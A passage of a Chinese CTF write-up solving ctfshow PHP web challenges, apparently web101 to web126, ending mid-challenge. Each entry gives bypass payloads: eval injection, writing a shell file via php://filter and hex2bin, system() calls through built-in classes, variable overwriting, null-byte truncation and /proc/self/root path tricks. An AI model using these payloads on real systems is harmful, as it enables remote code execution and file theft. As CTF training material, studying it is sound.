$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
```


由于涉及了类，可以利用 ReflectionClass 建立反射类。

<span style="color: rgb(216, 59, 100)"><strong>`new ReflectionClass($class)`</strong></span> 可以获得类的反射对象（包含元数据信息）。

元数据对象（包含class的所有属性/方法的元数据信息）。

<strong>代码逻辑</strong>

+ 检查 `v1`、`v2` 和 `v3` 是否为数字（但实际上只检查 `v1`）。
+ 确保 `v2` 和 `v3` 中不包含特定的特殊字符
+ 将 `v2` 和 `v3` 拼接成 PHP 代码并通过 `eval` 执行.

<strong>绕过方法</strong>

<strong>?v1=1&v2=echo new ReflectionClass&v3=;</strong>

最终得到的flag需要先ASCII 解码，发现还差一位 从0-9尝试即可  或使用bp爆破

<strong>拼接后代码</strong>：

    - `eval("$v2('ctfshow')$v3");` 会被替换为：

<strong>eval("echo new ReflectionClass('ctfshow');");</strong>

<strong>利用 </strong><strong>`ReflectionClass`</strong>：

+ `ReflectionClass` 是 PHP 的一个内置类，用于获取类的元信息（如方法、属性等）。
+ 通过 `new ReflectionClass('ctfshow')`，可以反射 `ctfshow` 类的信息，并输出到页面。

### web102

```php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if ($v4) {
    $s = substr($v2, 2);
    $str = call_user_func($v1, $s);
    echo $str;
    file_put_contents($v3, $str);
} else {
    die('hacker');
}
```


+ call_user_func()：  
用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数
+ file_put_contents()：  
写入内容到文件中，第一个参数是文件名，第二个参数是内容
+ hex2bin()：  
把十六进制值的字符串转换为 ASCII 字符（十六进制转二进制）。
+ substr(参数，n，参数)：

从参数中的第n+1位字符串中提取子字符串直至末尾（由参数3决定长短 可选）。

<strong>代码逻辑</strong>：

1. <strong>检查 </strong><strong>`v2`</strong><strong> 和 </strong><strong>`v3`</strong><strong> 是否为数字</strong>：
    - 只需确保 `v2` 是数字（如 `123`），`v3` 可以是任意值。
2. <strong>动态调用函数</strong>：
    - 将 `v1` 作为函数名，`substr($v2, 2)` 作为参数调用。
3. <strong>写入文件</strong>：
    - 将函数调用的结果写入 `v3` 指定的文件中。

<strong>绕过方法:</strong>

将下列中括号中的代码 base64 编码，注意末尾有一个空格。

 ``[<mark style="background-color: #FBDE28; color: #222"><?=`</mark><mark style="background-color: #FBDE28; color: #222">cat</mark><mark style="background-color: #FBDE28; color: #222"> *`; </mark>]``  ---->空格是为了去掉base64编码后得到的=

编码后的数据： PD89YGNhdCAqYDsg 

再将 base64 编码后的数据进行 16 进制 ASCII 编码。 编码后的数据： 5044383959474e686443417159447367

在编码后的数据前面随便加上两个占位数字，这里加 11。---->因为substr会取掉后面的内容 115044383959474e686443417159447367 

同时传递以下数据： 

v1=hex2bin 

v2=115044383959474e686443417159447367 

v3=php://filter/write=convert.base64-decode/resource=1.php 


这段代码的作用是：

1. 将输入的数据通过 `convert.base64-decode` 过滤器进行 Base64 解码。
2. 将解码后的数据写入 `1.php` 文件。


v1 以 POST 方式传输，v2，v3使用 GET。

<strong>?v2=115044383959474e686443417159447367&v3=php://filter/write=convert.base64-decode/resource=1.php</strong>

<strong>v1=hex2bin</strong>

之后访问 1.php 查看源码即可获取 flag。

<strong>太帅了这题</strong>

### web103

```php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if ($v4) {
    $s = substr($v2, 2);
    $str = call_user_func($v1, $s);
    echo $str;
    if (!preg_match("/\*p.*h.*p.*\*/i", $str)) {
        file_put_contents($v3, $str);
    } else {
        die('Sorry');
    }
} else {
    die('hacker');
}
```


与 web102 没有太大区别，沿用 web102 的解法。

正则表达式是用来检查是否存在 “php” 这个字符串的子串（不区分大小写）。

url + <strong>?v2=115044383959474e686443417159447367&v3=php://filter/write=convert.base64-decode/resource=1.php</strong>

<strong>v1=hex2bin</strong>

之后访问 1.php 查看源码即可获取 flag。

### web104

```php
highlight_file(__FILE__);
include("flag.php");

if (isset($_POST['v1']) && isset($_GET['v2'])) {
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if (sha1(sha1($v1)) == sha1($v2)) {
        echo $flag;
    } else {
        die('Sorry');
    }
} else {
    die('hacker');
}
```


sha1()：计算字符串的 sha1 散列值。

<strong>代码逻辑</strong>

+ 用户需要通过 `POST` 方法传递 `v1` 参数，并通过 `GET` 方法传递 `v2` 参数。
+ 代码会计算 `sha1(sha1($v1))` 和 `sha1($v2)`，并比较它们的值。
+ 如果两者相等，输出 `$flag`；否则，输出 `'Sorry'`。

#### <strong>绕过方法</strong>
<strong>利用弱类型比较</strong>：

    - 构造 `v1` 和 `v2`，使 `sha1(sha1($v1))` 和 `sha1($v2)` 的值以 `0e` 开头。
    - v1=aaroZmOk&v2=aaK1STfY----->这两个字符串的 SHA-1 哈希值都以 `0e` 开头，弱类型比较时会认为相等。
1. <strong>哈希碰撞</strong>：

<strong>哈希碰撞</strong>：

    - 使用已知的 SHA-1 碰撞对，使 `sha1(sha1($v1))` 和 `sha1($v2)` 相等。

此题传相同值即可

GET:		-->?v2=1

POST:	-->v1=1

### web105

```php
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);//关闭错误报告，以防止敏感信息泄露。
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value)
//遍历$_GET数组。
//如果键名为error，则终止脚本并输出"what are you doing?!"。
//否则，将$value的值赋给$key所命名的变量（使用变量变量$$key）
{
    if($key=='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
foreach($_POST as $key => $value)
//如果值为flag，则终止脚本并输出"what are you doing?!"。
//否则，将$value的值赋给$key所命名的变量（使用变量变量$$key）。
{
    if($value=='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);//---->在这我们即可获得flag了
}
echo "your are good".$flag."\n";
die($suces);

?>
你还想要flag嘛？
```



<details>
<summary>代码解释</summary>

#### `foreach($_GET as $key => $value)`<strong>的含义</strong>

- 这行代码的作用是遍历 `$_GET` 数组中的所有键值对。
- 在每次循环中：

- `$key` 会被赋值为当前参数的名称（例如 `name` 或 `age`）。
- `$value` 会被赋值为当前参数的值（例如 `John` 或 `25`）。

#### <strong>示例</strong>

假设 URL 是 `http://example.com/?name=John&age=25`，那么 `$_GET` 数组如下：

```php
$_GET = [
    'name' => 'John',
    'age' => '25'
];
```


当执行 `foreach($_GET as $key => $value)` 时：

1. 第一次循环：

- `$key = 'name'`
- `$value = 'John'`

2. 第二次循环：

- `$key = 'age'`
- `$value = '25'`

</details>


+ <span style="color: rgb(214, 51, 132)">`die()`</span>函数虽然会终止程序，但同时也会输出括号内的终止提示信息
+ <strong>变量覆盖</strong>（可变变量\$\$a），用于通过变量的值来动态命名变量并访问其值。

<strong>代码逻辑</strong>

+ 用户可以通过`GET`和`POST`方法传递参数。
+ 代码会处理这些参数，并根据`$_POST['flag']`是否等于`$flag`来决定输出内容。
+ 如果`$_POST['flag']`等于`$flag`，则输出`$flag`和成功消息；否则，输出错误消息。

<strong>绕过方法</strong>

+ 本题利用变量覆盖和<span style="color: rgb(214, 51, 132)">`die()`</span>函数的特性
    1. 先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=>flag的地址
    2. 再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=>flag的地址
    3. 此时无论进入哪个<span style="color: rgb(214, 51, 132)">`die()`</span>函数，都可以输出<span style="color: rgb(214, 51, 132)">`$flag`</span>的值

GET:	 <strong>?suces=flag</strong>

POST: <strong>error=suces</strong>

### web106

```php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(shal($v1) == shal($v2) && $v1 != $v2){
        echo $flag;
    }
}
```


<strong>代码逻辑</strong>

+ 用户需要通过POST方法传递`v1`参数，并通过GET方法传递`v2`参数。
+ 代码会计算`shal($v1)`和`shal($v2)`，并比较它们的值。
+ 如果两者相等且`v1`不等于`v2`，则输出`$flag`。
1. <strong>利用弱类型比较</strong>：
    - 构造`v1`和`v2`，使`shal($v1)`和`shal($v2)`的值以`0e`开头。

例如：

    - <strong>v1=aaroZmOk     v2=aaK1STfY</strong>

这两个字符串的哈希值都以`0e`开头，弱类型比较时会认为相等。

2. <strong>哈希碰撞</strong>：
    - 使用已知的哈希碰撞对，使`shal($v1)`和`shal($v2)`相等。
3. <strong>数组</strong>:

GET:   --->?v2`[]`=2

POST: --->v1`[]`=1

### web107

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
    parse_str($v1,$v2);
    if($v2['flag']==md5($v3))
    {
        echo $flag;
    }
}
```


parse_str(string,array)：把查询字符串解析到变量中。  
<strong> parse_str("a=1&b=2",\$array); </strong>

<strong>print_r(\$array); </strong>

<strong># 输出：Array(`[a]`=>1 `[b]`=>2)</strong>

<strong>`$v2['flag']`</strong><strong> 的含义</strong>

+ `$v2['flag']` 表示从数组 `$v2` 中获取键名为 `'flag'` 的值。
+ 在上面的例子中，`$v2['flag']` 的值是 `'value'`。

<strong>代码逻辑</strong>

+ 用户需要通过POST方法传递`v1`参数，并通过GET方法传递`v3`参数。
+ 代码会解析`v1`字符串为数组`$v2`，并比较`$v2['flag']`和`md5($v3)`的值。
+ 如果两者相等，则输出`$flag`。

所以根据代码 v1 传递内容是 v1=flag=0，具体值根据 v3 的 md5 值定。再加上是弱等于，只要 md5 加密后 0e (因为科学计数法)开头即可。

### web108

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg("~[a-zA-Z]+$", $_GET['c']) === FALSE) {
    die('error');
}

//只有36d的人才能看到flag
if (intval(strrev($_GET['c'])) == 0x36d) 
//检查转换后的整数是否等于 0x36d（即十进制的 877）。
{
    echo $flag;
}
```


+ ereg(): 用于执行正则表达式匹配。
+ strrev(): 反转字符串。
+ intval():  字符串转换为整数
+ ereg 函数存在 NULL 截断漏洞，可以绕过正则过滤，使用 %00 截断。


<details>
<summary>代码解释</summary>

<strong>正则表达式检查</strong>：

```php
if (ereg("~[a-zA-Z]+$", $_GET['c']) === FALSE) 
{
  die('error');
}
```


这段代码使用 `ereg` 函数检查 `$_GET['c']` 是否匹配正则表达式 `~[a-zA-Z]+$`。

- 如果匹配失败（即 `ereg` 返回 `FALSE`），则终止脚本并输出 `'error'`。
- 正则表达式 `~[a-zA-Z]+$` 的含义是：字符串必须以 `~` 开头，后跟一个或多个字母（大小写均可），并以字母结尾。

</details>


<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递`c`参数。
+ 代码会检查`c`参数是否匹配正则表达式 `~[a-zA-Z]+$`。
+ 如果匹配，则反转`c`参数并将其转换为整数，检查是否等于 `0x36d`（即 `877`）。
+ 如果相等，则输出`$flag`；否则，输出`'error'`。

答案：

<strong>?c=a%00778</strong>

### web109

```php
highlight_file(__FILE__);
error_reporting(0);

if (isset($_GET['v1']) && isset($_GET['v2'])) {
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if (preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)) {
        eval("echo new $v1($v2());");
    }
}
```



<details>
<summary>代码解释</summary>

<strong>动态创建对象并调用方法</strong>：

1. <strong>eval("echo new \$v1(\$v2());");</strong>

这段代码使用 `eval` 函数动态执行 PHP 代码：

- `new $v1($v2())`：动态创建一个 `$v1` 类的对象，并将 `$v2()` 的返回值作为构造函数的参数。
- `echo`：输出创建的对象。

</details>


这道题用到魔术方法 <span style="color: rgb(216, 59, 100)"><strong>`__toString()`</strong></span>，不少 php 的内置类里都包含有这个方法，如 <span style="color: rgb(216, 59, 100)"><strong>`Reflectionclass`</strong></span>、<span style="color: rgb(216, 59, 100)"><strong>`Exception`</strong></span>、<span style="color: rgb(216, 59, 100)"><strong>`Error`</strong></span>、<span style="color: rgb(216, 59, 100)"><strong>`CachingIterator`</strong></span>。

<span style="color: rgb(216, 59, 100)"><strong>`__toString()`</strong></span>：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。

所以 echo 使得 v1 类触发 <span style="color: rgb(216, 59, 100)"><strong>`__toString()`</strong></span>，v2 传递的数据被输出。

<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递`v1`和`v2`参数。
+ 代码会检查`v1`和`v2`是否只包含字母。
+ 如果检查通过，则动态创建一个 `$v1` 类的对象，并将 `$v2()` 的返回值作为构造函数的参数，最后输出该对象。

<strong>绕过方法</strong>

<strong>?v1=CachingIterator&v2=system(ls)</strong>

<strong>url + ?v1=CachingIterator&v2=system('cat fl36dg.txt')   </strong>也可以换成其他类。

### web110

```php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/\'|"|`|\^|\$|\&|\%|\*|\||\@|\#|\{|\}|$$|$$|\;|\?|\>|\<|\/|\\|\,/', $v1)){
        die("error v1");
    }
    if(preg_match('/\'|"|`|\^|\$|\&|\%|\*|\||\@|\#|\{|\}|$$|$$|\;|\?|\>|\<|\/|\\|\,/', $v2)){
        die("error v2");
    }
    eval("echo new $v1($v2);");
}
```


+ php 内置类，利用 FilesystemIterator 获取指定目录下的所有文件。
+ getcwd() 函数，获取当前工作目录，返回当前工作目录。

<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递`v1`和`v2`参数。
+ 代码会检查`v1`和`v2`是否包含特定的特殊字符。
+ 如果检查通过，则动态创建一个 `$v1` 类的对象，并将 `$v2` 作为构造函数的参数，最后输出该对象。

<strong>?v1=FilesystemIterator&v2=getcwd</strong>

可以看到 flag 文件就在当前目录，直接访问获取 flag。

### web111

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
 
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1))
    {
            getFlag($v1,$v2);
    }    
}
?>
```



<details>
<summary>代码解释</summary>

<strong>定义</strong>`getFlag`<strong>函数</strong>：

```php
function getFlag(&$v1, &$v2) 
{
  eval("$$v1 = &$$v2;");
  var_dump($$v1);
}
```



- `getFlag` 函数接受两个参数 `$v1` 和 `$v2`。
- 使用 `eval` 函数动态执行 PHP 代码：

- `$$v1 = &$$v2;`：将 `$v2` 所命名的变量的引用赋值给 `$v1` 所命名的变量。
- `var_dump($$v1);`：输出 `$v1` 所命名的变量的内容。

```php
$n1=a;$n2=b;
$$n1=$a;$$n2=$b;  ==>  $a=&$b;
#变量b将地址传给了变量a，即两个变量指向同一个地址
```


<strong>检查</strong>`v1`<strong>是否包含</strong>`ctfshow`：

```php
if (preg_match('/ctfshow/', $v1)) 
{
  getFlag($v1, $v2);
}
```


这段代码检查 `v1` 是否包含字符串 `"ctfshow"`。

- 如果包含，则调用 `getFlag` 函数，传入 `v1` 和 `v2` 作为参数。

</details>


<strong>代码逻辑</strong>


+ 要求 v1 中包含字符串 "ctfshow"，才会调用 getflag 函数
+ 将 \$v2 的值引用赋给 \$v1 对应的变量，即 \$ctfshow，之后打印变量 \$\$v1（\$ctfshow） 的信息
    - 
+ 如果将\$v2赋值为flag，就得到\$flag，再将\$flag赋值给\$ctfshow，然后输出\$ctfshow 实际输出的是\$flag的内容

<strong>?v1=ctfshow&v2=flag</strong>

+ 但返回的是NULL，因为\$flag在自定义函数getFlag函数中没有定义，\$flag是属于flag.php中的变量，对于getFlag来说是外部变量，不能直接使用。
    - 
+ 因此这里使用超全局变量\$GLOBALS,GLOBALS是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。(global必须大写)
    - 
+ <strong>?v1=ctfshow&v2=GLOBALS</strong>

### web112

```php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");//注意过滤的是 ../ -->表示返回上一级目录
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file))
{
    highlight_file(filter($file));
}
else
{
    echo "hacker!";
}
```


同时if判断要求file不能为文件，可以用包装器伪协议来绕过。  
伪协议不影响file_get_contents，和highlight_file。

+ `rot13`：表示ROT13编码。
+ `base64`：表示Base64编码。

<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递`file`参数。
+ 代码会检查`file`参数是否包含特定的字符串。
+ 如果检查通过，并且`file`不是一个文件，则高亮显示过滤后的文件内容。
+ 如果`file`是一个文件，则输出`"hacker!"`。

<strong>绕过方法：</strong>

<strong>payload1</strong>：`?file=php://filter/resource=flag.php`

<strong>payload2</strong>：也可以用web117的convert.iconv过滤器读取。  
`?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php`


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-093.webp)  
 读完需要转一下。


```php
<?php
#因为有特殊符号，需要加上转义符
$flag="f\$al=gc\"fthswo3{71eeb1-9103f4-7d-1b88f7-d90e06ab44}9;\"";
$result=iconv("UCS-2BE","UCS-2LE",$flag);
echo  "flag:".$result."\n";
?>
```


<strong>payload3</strong>：转换过滤器convert里还有一个quoted-printable-encode可以用。

`?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php`

<strong>payload4</strong>：封装协议zip：`?file=compress.zlib://flag.php`  
compress.zlib类似gzopen()


<details>
<summary>补充</summary>

compress.zlib类似gzopen()![](/article-assets/2025/ctfshow-web-notes/images/screenshot-094.webp)

<strong>进一步学习</strong>：可以查看一下php手册学习一个各个协议。  
![](/article-assets/2025/ctfshow-web-notes/images/screenshot-095.webp)  
file协议不能绕过is_file的判断。  
http协议需要公网ip。  
glob协议返回的是一个数组。highlight_file不能对数组进行高亮，所以本题不能用。

</details>


### web113

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
  if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
    die('hacker!');
  }else{
    return $file;
  }
}
$file=$_GET['file'];
if(! is_file($file)){
  highlight_file(filter($file));
}else{
  echo "hacker!";
}
```


<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递`file`参数。
+ 代码会检查`file`参数是否包含特定的字符串。
+ 如果检查通过，并且`file`不是一个文件，则高亮显示过滤后的文件内容。
+ 如果`file`是一个文件，则输出`"hacker!"`。

方法一：

多过滤了filter 使用上题的方法四


```markdown
?file=compress.zlib://flag.php
```


方法二：

目录溢出导致is_file认为这不是一个文件。同样也适用Web112

而且linux有个特性，/proc/self/root是指向根目录的，也就是如

果在命令行中输入ls /proc/self/root，其实显示的内容是根目录

下的内容   

`/proc/self`：不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。`/proc/self/root/`是指向`/`的符号链接，就是根目录。

多次重复后绕过is_file。


```php
?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```


### web114

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
  if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
    die('hacker!');
  }else{
    return $file;
  }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
  highlight_file(filter($file));
}else{
  echo "hacker!";
}
```


限制了compress和convert和root，但是没有限制php://filter

<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递`file`参数。
+ 代码会检查`file`参数是否包含特定的字符串。
+ 如果检查通过，并且`file`不是一个文件，则高亮显示过滤后的文件内容。
+ 如果`file`是一个文件，则输出`"hacker!"`。

<strong>绕过方式</strong>

<strong>?file=php://filter/resource=flag.php</strong>

### web115

```php
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
  $num=str_replace("0x","1",$num);//将0x替换为1  以下以此类推
  $num=str_replace("0","1",$num);
  $num=str_replace(".","1",$num);
  $num=str_replace("e","1",$num);
  $num=str_replace("+","1",$num);
  return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
  if($num=='36'){
    echo $flag;
  }else{
    echo "hacker!!";
  }
}else{
  echo "hacker!!!";
}
```


is_numeric可以在数字前面加空格绕过，同时加上空格可以绕过`$num!=='36'`

trim是移除字符串两侧的空白字符或其他预定义字符，可以看到空格等字符是会被去掉的，那么可以用`%0c`

+ trim()函数：

`string trim ( string $str [, string $character_mask = " \t\n\r\0\x0B" ] )`

此函数返回字符串 `str` 去除首尾空白字符后的结果。如果不指定第二个参数，`trim()` 将去除这些字符：

+ `" "` (ASCII 32 (0x20))，普通空格符。
+ `"\t"` (ASCII 9 (0x09))，制表符。
+ `"\n"` (ASCII 10 (0x0A))，换行符。
+ `"\r"` (ASCII 13 (0x0D))，回车符。
+ `"\0"` (ASCII 0 (0x00))，空字节符。
+ `"\x0B"` (ASCII 11 (0x0B))，垂直制表符。

<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递`num`参数。
+ 代码会检查`num`参数是否为数字，并且不等于 `'36'`。
+ 代码会检查`trim($num)` 是否不等于 `'36'`。
+ 代码会检查`filter($num)` 是否等于 `'36'`。
+ 如果以上条件都满足，则进一步检查 `$num` 是否等于 `'36'`。
    - 如果 `$num` 等于 `'36'`，则输出 `$flag`。
    - 否则，输出 `"hacker!!"`。
+ 如果以上条件不满足，则输出 `"hacker!!!"`。

<strong>绕过方法：</strong>

使用`%0c`也可以绕过filter


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-096.webp)

可以看到`!==`时不进行类型转换，所以字符串和数值比较，类型不同，结果true；同样加上`%0c`换页符，在`==`进行类型转换，会被转换为数值的36，结果为true

<strong>?num=%0c36</strong>

### web123

```php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g']))
{
  if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18)
  {
     eval("$c".";"); 
     if($fl0g==="flag_give_me"){
       echo $flag;
     }
  }
}
```


<strong>代码逻辑</strong>

+ 用户需要通过POST方法传递`CTF_SHOW`和`CTF_SHOW.COM`参数，并且不能通过GET方法传递`fl0g`参数。
+ 用户需要通过POST方法传递`fun`参数。
+ 代码会检查`fun`参数是否包含特定的特殊字符，并且是否小于或等于 `18`。
+ 如果检查通过，则动态执行`fun`参数中的 PHP 代码。
+ 如果执行后的 `$fl0g` 变量等于 `"flag_give_me"`，则输出 `$flag`。

<strong>绕过方法</strong>

方法一：


<details>
<summary>详细说明</summary>

在给参数传值时，如果参数名中存在非法字符，比空格和点，则参数名中的点和空格等非法字符都会被替换成下划线。所以参数名不一定要CTF_SHOW;CTF SHOW和CTF.SHOW都可以

<strong>在PHP8之前，如果参数中出现中括号 [ ，那么中括号会被转换成下划线 _ ，但是会出现转换错误，导致如果参数名后面还存在非法字符，则不会继续转换成下划线。</strong>也就是说，我们可以刻意拼接中括号制造这种错误，来保留后面的非法字符不被替换，因为中括号导致只会替换一次。

由于没有过滤字母和空格，直接用 echo 输出 flag

```php
CTF_SHOW=&CTF[SHOW.COM=&fun=$flag
```


</details>


方法二：

在PHP中，\$_SERVER`['a']`用于获取脚本的命令行参数，通常，这是在命令行模式下运行 PHP 脚本时使用的，而不是在网页模式下使用。

当在命令行模式下运行 PHP 脚本时，例如： php script.php arg1 arg2

那么 \$_SERVER`['argv']` 将包含以下内容：


```php
$_SERVER['argv'][0] = 'script.php';  // 脚本名
$_SERVER['argv'][1] = 'arg1';        // 第一个参数
$_SERVER['argv'][2] = 'arg2';        // 第二个参数
```


在网页模式下（通过浏览器访问 PHP 脚本），\$_SERVER`['argv']` 通常不包含有用的信息，因为网页请求没有命令行参数。然而，<strong>有时服务器配置会将查询字符串或其他信息填充到\$ _SERVER`['argv']`中</strong>


```php
get：?$fl0g=flag_give_me;
post：CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])
```



<details>
<summary>详细说明</summary>

<strong>这里的查询字符串没有包含 fl0g，但包含了 \$fl0g。由于 PHP 中的变量名不包括 \$ 符号，所以 isset(\$_GET`['fl0g']`) 仍然会返回 false，即没有检测到 fl0g 参数。</strong>

<strong>post 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset(\$_POST`['CTF_SHOW']`) && isset(\$_POST`['CTF_SHOW.COM']`) 这部分条件为真，fun=eval(\$a`[0]`) 将 eval(\$a`[0]`) 的代码传递给 \$c。</strong>

<strong>准确来说，此时的 \$_SERVER`[‘argv’]``[0]` 就等于 \$_SERVER`[‘QUERY_STRING’]`，\$_SERVER`["QUERY_STRING"]` 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。</strong>

<strong>举个例子：</strong>

<strong><span style="color: #ED740C">http://example.com/test.php?arg1=value1&arg2=value2</span></strong>

<strong>输出结果：</strong>

<strong>参数数组：</strong>

<strong>Array</strong>

<strong>(</strong>

<strong>`[0]` => test.php</strong>

<strong>`[1]` => arg1=value1</strong>

<strong>`[2]` => arg2=value2</strong>

<strong>)</strong>

<strong>当访问 ?\$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 \$_SERVER`['argv']` 中。</strong>

<strong>在这种配置下，\$_SERVER`['argv']``[0]` 包含了整个查询字符串，即 '\$fl0g=flag_give_me;'。</strong>

<strong>在 eval("\$c;"); 中实际执行的是 eval('eval(\$a`[0]`);');，因为 \$a`[0]` 是 '\$fl0g=flag_give_me;'，这相当于执行了 eval('\$fl0g=flag_give_me;');，这样就定义了变量 \$fl0g 并赋值为 'flag_give_me'。</strong>

</details>


方法三：


```php
get: ?a=1+fl0g=flag_give_me
post: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
```



<details>
<summary>详细说明</summary>

还是举一个例子：

```php
http://example.com/test.php?;ls+-l
Array
(
    [0] => test.php
    [1] => ;ls+-l
)
```


被设置为;ls -l，然后被传递到 system() 函数中执行，导致服务器的文件列表被列出，从而引发远程代码执行（RCE）漏洞。

通过加号`+`分割argv成多个部分，也是为了得到fl0g=flag_give_me，parse_str()函数用来把查询字符串解析到变量中

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-097.webp)

</details>


### web125

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```


上题的方法二和方法三仍可以用

<strong>题目说明</strong>

限制了flag、GLOBALS和echo

题目中限制了一些函数，phpinfo失败，当然system之类的也不行。

输出内容函数大多被限制了，但是highlight_file肯定没有被限制，当前页面就用到了，所以用highlight_file高亮显示。限制了长度，那么可以考虑get再传参。

<strong>payload</strong>：  
get：`?1=flag.php`  
post：`CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])`

其他的payload：


```php
?1=flag.php
post：CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])
 
CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_POST[1])&1=flag.php
 
CTF_SHOW=&CTF[SHOW.COM=&fun=include($_POST[1])&1=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php
 
CTF_SHOW=&CTF[SHOW.COM=&fun=require($_POST[1])&1=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php
 
CTF_SHOW=&CTF[SHOW.COM=&fun=var_export(get_defined_vars())
```


### web126

```php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
